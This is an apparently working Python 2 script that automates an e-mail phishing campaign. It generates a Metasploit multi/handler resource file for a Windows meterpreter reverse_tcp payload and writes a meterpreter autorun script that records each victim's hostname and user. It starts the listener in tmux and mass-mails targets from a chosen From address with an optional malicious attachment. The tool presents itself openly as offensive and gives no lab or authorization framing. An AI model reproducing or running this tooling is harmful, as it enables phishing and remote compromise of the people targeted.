#!/usr/bin/env python

import os
import sys
import errno
import socket
import subprocess
import signal
import datetime
import smtplib
import email
import email.mime.application
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.MIMEMessage import MIMEMessage
from email.MIMEBase import MIMEBase
from email import encoders
from email.Utils import COMMASPACE

# This class is to add some color to the text, making the output more readable
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def greeting():
    # Lets start with a clean screen
    subprocess.call("clear")

    # Greet the user
    print (bcolors.FAIL + "Welcome, lets go phishing!\n")
    print (bcolors.OKBLUE + "Step 1: Phishing\n")
    print (bcolors.OKBLUE + "Step 2:\n")
    print (bcolors.OKBLUE + "Step 3: " + bcolors.OKGREEN + "Profit!\n\n" + bcolors.ENDC)


def initial_setup():
    # Setup the necessary directory structure, if it is not already there
    usage = ""
    try:
        if os.path.isdir("logs") is False:
            usage = "Y"
            os.makedirs("logs")
            print(bcolors.WARNING + "I've created the missing 'logs' directory\n" + bcolors.ENDC)
    except OSError as exception:
        if exception.errno != errno.EEXIST:
            raise
    try:
        if os.path.isdir("msf") is False:
            usage = "Y"
            os.makedirs("msf")
            print(bcolors.WARNING + "I've created the missing 'msf' directory\n" + bcolors.ENDC)
    except OSError as exception:
        if exception.errno != errno.EEXIST:
            raise
    try:
        if os.path.isdir("docs") is False:
            usage = "Y"
            os.makedirs("docs")
            print(bcolors.WARNING + "I've created the missing 'docs' directory\n" + bcolors.ENDC)
    except OSError as exception:
        if exception.errno != errno.EEXIST:
            raise
    try:
        if os.path.isdir("mail") is False:
            os.makedirs("mail")
            usage = "Y"
            print(bcolors.WARNING + "I've created the missing 'mail' directory\n" + bcolors.ENDC)
    except OSError as exception:
        if exception.errno != errno.EEXIST:
            raise
    try:
        if os.path.isdir("targets") is False:
            os.makedirs("targets")
            usage = "Y"
            print(bcolors.WARNING + "I've created the missing 'targets' directory\n" + bcolors.ENDC)
    except OSError as exception:
        if exception.errno != errno.EEXIST:
            raise

    if usage == "Y":
        show_usage()


def show_usage():
    # Display a usage message and exit
    print("Usage:\n")
    print("If any arguments are passed to the script, or if any of the directory structure was missing this message will display\n")
    print("\n- Create a file with a list of targets (e-mail addresses of those you want to phish), one per line in the 'targets' directory")
    print("- Create a file with the body you'd like for your e-mail, and put it in the 'mail' directory")
    print("- Create an attachment if you'd like to send one, and put it in the 'docs' directory")
    print("\nThen re-run this script, and it will walk you through creating a phishing campaign\n")
    sys.exit()


def start_campaign():
    # Setup a brand new phishing campaign
    
    # Wrap commands in this try statement to capture ctrl+c
    try:
        # These variables set as global so they can be passed to the 'quiet_shutdown' function if ctrl+c is pressed
        global campaign_name

        # Prompt the user to name this campaign
        while True:
            campaign_name = raw_input("\nWhat do you want to name this campaign? ")
            log = "logs/" + campaign_name + "_campaign.log"
            # Verify a campaign by this name doesn't already exist
            if os.path.exists(log):
                print (bcolors.WARNING + "A campaign by this name already exists!  Try again\n" + bcolors.ENDC)
            else:
                break

        # Set the current time into a variable for the log file
        date = str(datetime.datetime.now().ctime())

        # Verify the file doesn't exist
        if not os.path.exists(log):
            with open(log, 'w') as l:
                l.write('The ' + campaign_name + ' campaign began ' + date + '\n\n')
    except KeyboardInterrupt:
        print("You've decided to quit before we did anything, so nothing to clean up\n")
        sys.exit()

    # Wrap commands in this try statement to capture ctrl+c
    try:    
        meterpreter_script(campaign_name)
        setup_resource(campaign_name)
    except KeyboardInterrupt:
        quiet_shutdown(campaign_name)
        print("\nYou've decided to quit, so I've cleaned up what was setup so far.  Exiting!\n")
        sys.exit()


def setup_resource(campaign_name):
    # Set some variables for the MSF resource file
    resource_file = "msf/" + campaign_name + "_campaign.rc"

    my_port = check_port()

    # Write the resource file, this is the file used to set options when starting msfconsole
    if not os.path.exists(resource_file):
        with open(resource_file, 'w') as r:
            r.write('use exploit/multi/handler\n')
            r.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
            r.write('set LHOST 0.0.0.0\n')
            r.write('set LPORT ' + str(my_port) + '\n')
            r.write('set ExitOnSession false\n')
            r.write('set AutoRunScript ' + campaign_name + '_phishing\n')
            r.write('exploit -j -z')
        call_msf(resource_file, my_port)
    else:
        print("The resource file already exists, exiting!")
        quiet_shutdown(campaign_name)
        sys.exit()


def meterpreter_script(campaign_name):
    script_file = "/usr/share/metasploit-framework/scripts/meterpreter/" + campaign_name + "_phishing.rb"
    log_path = os.path.dirname(os.path.realpath(__file__)) + "/logs/"

    # Create a slightly customized meterpreter script specific to the current campaign, to capture info about our phishing victims
    if not os.path.exists(script_file):
        with open(script_file, 'w') as m:
            m.write('time_stamp = ::Time.now.asctime\n')
            m.write('logs = "' + log_path + '"\n')
            m.write('@dest = logs + "' + campaign_name + '_campaign.log"\n')
            m.write("host_name = session.sys.config.sysinfo['Computer']\n")
            m.write('phished_user = session.sys.config.getuid\n')
            m.write('file_local_write(@dest,"**********New session opened**********")\n')
            m.write('file_local_write(@dest,time_stamp)\n')
            m.write('file_local_write(@dest,"Attachment opened by: #{phished_user}")\n')
            m.write('file_local_write(@dest,"The hostname is: #{host_name}")\n')
            # The r in the following line means raw, using it to preserve the newline character that needs to be in the script we're writing
            m.write(r'file_local_write(@dest,"\n")')
            m.write('\n')
            m.write('session.kill')


def call_msf(resource_file, campaign_port):
    # Run the msfconsole in the background so it can catch incoming requests from our victims
    # Using tmux so it runs outside the SSH session, and so we can check in on it if needed
    tmux = "tmux new-session -d -s " + str(campaign_port)
    msf = "msfconsole -r " + resource_file
    tmux_send = "tmux send -t " + str(campaign_port) + " '" + msf + "'" + " ENTER"
    tmux_list_session = "tmux list-session"

    # Create a tmux session that we can run in, named after the chosen port for this campaign
    # Then run msfconsole in the new tmux session
    try:
        subprocess.call(tmux, shell=True)
        subprocess.call(tmux_send, shell=True)
    except SystemError:
        print(bcolors.FAIL + "Unable to start the msfconsole listener in tmux.  Exiting!\n" + bcolors.ENDC)
        quiet_shutdown(campaign_name)
        sys.exit()

    send_mail()


def check_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        lport = raw_input("\nWhat port should meterpreter connect back on? " + bcolors.OKGREEN + " Default 10000 " + bcolors.ENDC)

        # Make sure we have a valid port
        if lport:
            try:
                lport = int(lport)
            except ValueError:
                lport = ""
                print(bcolors.WARNING + "\nYou did not enter a valid port, try again!\n" + bcolors.ENDC)
        else:
            # This function verifies a port is not currently in use before attempting to bind to it
            try:
                # If no port is entered, default to port 10000
                print("\nUsing default port of 10000\n")
                lport = 10000
                server_address = ('localhost', lport)
                print("\nChecking that the port is not already in use\n")
                s.bind(server_address)
                s.close()
                print(bcolors.OKGREEN + "\nLooks good, I'll use it!\n" + bcolors.ENDC)
                break
            except socket.error, msg:
                print(bcolors.WARNING + "It appears that port is already in use, please choose a different port\n" + bcolors.ENDC)
                continue

        # Make sure lport is a valid number
        if lport <= 65535:
            try:
                print("\nChecking that the port is not already in use\n")
                server_address = ('localhost', lport)
                s.bind(server_address)
                s.close()
                print(bcolors.OKGREEN + "\nLooks good, I'll use it!\n" + bcolors.ENDC)
                print(bcolors.WARNING + "\nBe sure port " + str(lport) + " is open in the Azure firewall" + bcolors.ENDC)
                break
            except socket.error, msg:
                print(bcolors.WARNING + "\nIt appears that port is already in use, please choose a different port\n" + bcolors.ENDC)
                continue

    return lport


def send_mail():
    # Construct and send the phishing e-mails
    print(bcolors.OKGREEN + "\nNow that the listener is setup, lets send some malicious e-mails!\n" + bcolors.ENDC)
    # Promt the user for the 'from' address
    print("What should the 'From' address be?\n")
    email_from = raw_input(bcolors.OKBLUE + "From > " + bcolors.ENDC)

    # Prompt the user for a text file with a list of targets
    print("\nWhich target file do you want to use? It should include each target's e-mail address, one per line.")
    
    targets_path = "targets"

    # List the files to make it easier for the user to choose the correct file
    list_files(targets_path)

    # Get the user's target file choice
    while True:
        print("Which file do you want to use?\n")
        targets = targets_path + "/" + raw_input(bcolors.OKBLUE + "targets file > " + bcolors.ENDC)
    
        # Build the 'To' list for sending the e-mail
        try:
            with open(targets, 'r') as a:
                to_list = [x.strip('\n') for x in a.readlines()]
                break
        except IOError:
            print(bcolors.WARNING + "I couldn't read the file you specified, try again!\n" + bcolors.ENDC)

    # Preview the first 5 targets so the user can verify they chose the correct file
    print("\nHere is a preview of the targets file you chose, please make sure it is correct:\n")
    for address in to_list[:5]:
        print(bcolors.OKGREEN + "- " + address + bcolors.ENDC)

    # Prompt if sending to multiple targets or one for each verify we have a valid response
    while True:
        multiple = raw_input("\nSend one message to all targets?\nY for one message\nN to send an e-mail per targets in the file\n" + bcolors.OKBLUE + "Y or N " + bcolors.ENDC)
        if multiple.upper() in ('Y', 'N'):
            break
        else:
            print(bcolors.WARNING + "That is not a valid response, try again!\n" + bcolors.ENDC)

    # Prompt the user for a subject
    print("\nWhat do you want the subject of the e-mail to be?\n")
    subject = raw_input(bcolors.OKBLUE + "subject > " + bcolors.ENDC)

    # Prompt the user for a file containing the e-mail body
    print("\nWhich file do you want to use for the e-mail body?\n")

    body_path = "mail"

    #List the files to make it easier for the user to choose the correct file
    list_files(body_path)

    # Get the user's body file choice
    while True:
        print("Which file do you want to use?\n")
        body = body_path + "/" + raw_input(bcolors.OKBLUE + "body file > " + bcolors.ENDC)
        # Verify the file exists
        if os.path.isfile(body):
            with open(body, 'r') as b:
                body_text = b.read()
            msg = email.mime.Multipart.MIMEMultipart()
            mail_body = email.mime.Text.MIMEText(body_text)
            msg.attach(mail_body)
            break
        else:
            print(bcolors.WARNING + "I couldn't read the file you specified, try again\n" + bcolors.ENDC)

    try:
        # Preview the first 5 lines of the file chosen for the mail body so the user can verify they chose the correct file
        print("\nHere is a preview of the body file you chose, please make sure it is correct:\n")
        with open(body, 'r') as mail_body:
            for line in mail_body:
                print(bcolors.OKGREEN + line + bcolors.ENDC)
    except IOError:
        print(bcolors.FAIL + "I couldn't read the body file, exiting!\n" + bcolors.ENDC)

    # Prompt the user to see if they want to include an attachment
    attach = raw_input("\nTo include an attachment, first copy it to the docs directory \n"
            "Do you want to include an attachment? " + bcolors.OKBLUE + "Y/N " + bcolors.ENDC)
    if attach.upper() == "Y":
        docs_path = "docs"
        # Give the user a list of files currently in the docs directory, to make it easier to choose
        list_files(docs_path)

        # Get the user's attachment choice
        while True:
            print("Which file do you want to use?\n")
            attachment = docs_path + "/" + raw_input(bcolors.OKBLUE + "attachment > " + bcolors.ENDC)
            # Verify the attachment file exists
            if os.path.isfile(attachment):
                break
            else:
                print(bcolors.WARNING + "I couldn't read the file you specified, try again\n" + bcolors.ENDC)

    # Send the e-mail message
    s = smtplib.SMTP('localhost')
    msg['Subject'] = subject
    msg['From'] = email_from
    if attach.upper() == "Y":
        # Set the attachment
        # msg.attach(MIMEMessage(file(attachment).read()))
        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(attachment,"rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attachment))
        msg.attach(part)

    # Set the 'To' variables, either one message to many or one message per target
    if multiple.upper() == "Y":
        # Set a variable to a comma and space to separate e-mail addresses
        msg['To'] = COMMASPACE.join(to_list)
        try:
            s.sendmail(email_from, to_list, msg.as_string())
            s.close()
        except smtplib.SMTPException:
            print("Error: unable to send email")
    else:
        for address in to_list:
            msg['To'] = address
            try:
                s.sendmail(email_from, address, msg.as_string())
                s.close()
            except smtplib.SMTPException:
                print("Error: unable to send e-mail")


def list_files(directory):
    # Give the user a list of files in a given directory
    try:
        my_files = []
        for (dirpath, dirnames, filenames) in os.walk(directory):
            my_files.extend(filenames)
            break
        print("\nYour file options are:")
        for f in my_files:
            print(bcolors.OKGREEN + "- " + f + "\n" + bcolors.ENDC)
    except IOError:
        print(bcolors.WARNING + "I couldn't find the " + directory + " directory, so I can't print your file options\n" + bcolors.ENDC)


def end_campaign():
    # This function ends a campaign,

    # Setup the same variables that were setup during campaign setup
    campaign_name = raw_input("\nWhich campaign would you like to end? ")
    print ("\nEnding the " + campaign_name + " campaign. " + bcolors.OKGREEN + "Time to boat these bass!\n" + bcolors.ENDC)
    log = "logs/" + campaign_name + "_campaign.log"
    date = str(datetime.datetime.now().ctime())
    resource_file = "msf/" + campaign_name + "_campaign.rc"
    script_file = "/usr/share/metasploit-framework/scripts/meterpreter/" + campaign_name + "_phishing.rb"

    # Check for the resource script
    if not os.path.exists(resource_file):
        print(bcolors.WARNING + "\nThe MSF resource script wasn't found, so I don't know which tmux session to shutdown!\n"
              "Please do it manually if it is still open\n" + bcolors.ENDC)

    # If the resource file exists, look in it for the port number so we know which tmux session to end    
    else:
        with open(resource_file, 'rt') as r:
            for line in r:
                if line.startswith('set LPORT'):
                    port_number = line.rsplit()
                    campaign_port = port_number[2]
                    shutdown_msf(campaign_port)

    # Check to make sure the log file still exists
    if os.path.exists(log):
        with open(log, 'a') as l:
            l.write('The ' + campaign_name + ' campaign ended ' + date + '\n')
    else:
        print (bcolors.FAIL + "The log file no longer exists, that shouldn't happen!\n" + bcolors.ENDC)

    # Cleanup the resource and meterpreter files
    print (bcolors.OKBLUE + "\nCleaning up the Metasploit scripts we created for this campaign\n" + bcolors.ENDC)
    if os.path.exists(resource_file):
        os.remove(resource_file)
    else:
        print (bcolors.WARNING + "The resource file no longer exists, nothing to do\n" + bcolors.ENDC)

    if os.path.exists(script_file):
        os.remove(script_file)
    else:
        print (bcolors.WARNING + "The meterpreter script no long exists, nothing to do\n" + bcolors.ENDC)

    print (bcolors.OKGREEN + "The " + campaign_name + " phishing campaign has officially ended\n" + bcolors.ENDC)


def shutdown_msf(campaign_port):
    # We need to kill msfconsole, as well as the tmux session we created to run it in
    tmux_exit = "tmux send -t " + str(campaign_port) + " 'exit' " + "ENTER"
    
    # First, attach to the tmux session and type exit to close msfconsole
    try:
        subprocess.call(tmux_exit, shell=True)
        print(bcolors.OKBLUE + "Successfully shutdown the msfconsole started for this campaign\n" + bcolors.ENDC)
    except ChildProcessError:
        print(bcolors.WARNING + "Unable to connect to the tmux session to stop msfconsole, please shut it down manually if it is still running\n")
        print("To shut it down, type tmux attach -t <port_for_campaign>, then type exit in the tmux session\n" + bcolors.ENDC)

    # Next, do the same thing to end the tmux session
    try:
         subprocess.call(tmux_exit, shell=True)
         print(bcolors.OKBLUE + "Successfully shutdown the tmux session created for this session" + bcolors.ENDC)
    except ChildProcessError:
         print(bcolors.WARNING + "Unable to exit the tmux session, please shut it down manually if it is still running\n")
         print("Run tmux session-list to see if the session is still alive\n" + bcolors.ENDC)


def quiet_shutdown(campaign_name):
    # Called if the user quits the script, so it can do some cleanup operations
    
    # Set the locations of our files, so they can be removed
    resource_file = "msf/" + campaign_name + "_campaign.rc"
    script_file = "/usr/share/metasploit-framework/scripts/meterpreter/" + campaign_name + "_phishing.rb"
    log_file = "logs/" + campaign_name + "_campaign.log"

    # Get the port from the resource file so we can then shutdown the tmux session
    if os.path.exists(resource_file):
        with open(resource_file, 'rt') as r:
            for line in r:
                if line.startswith('set LPORT'):
                    port_number = line.rsplit()
                    campaign_port = port_number[2]
        os.remove(resource_file)

    if os.path.exists(script_file):
        os.remove(script_file)

    if os.path.exists(log_file):
        os.remove(log_file)

    tmux_exit = "tmux send -t " + str(campaign_port) + " 'exit' " + "ENTER"

    # First, attach to the tmux session and type exit to close msfconsole
    try:
        subprocess.call(tmux_exit, shell=True)
    except ChildProcessError:
        print("")

        # Next, do the same thing to end the tmux session
    try:
        subprocess.call(tmux_exit, shell=True)
    except ChildProcessError:
        print("")


# Begin main program execution
if __name__ == "__main__":
    # Display the splash screen
    greeting()

    # Create the directory structure if it's not already there
    initial_setup()

    start = raw_input("Do you want to start or end a campaign? start/end ")

    # Wrap the rest of the program in the following try statement, to gracefully end if ctrl+c is pressed
    try:
        if start.lower() == 'start':
            start_campaign()
        elif start.lower() == 'end':
            end_campaign()
        else:
            print(bcolors.FAIL + "\nI don't know what you mean, exiting!\n" + bcolors.ENDC)
            sys.exit()

    except KeyboardInterrupt:
        if start.lower() == 'start':
            quiet_shutdown(campaign_name)
            print("\nYou've decided to quit, so I'm going to cleanup some things now!\n")
        elif start.lower() == 'end':
            print("\nYou've decided to quit before ending a campaign, so nothing has been done!\n")

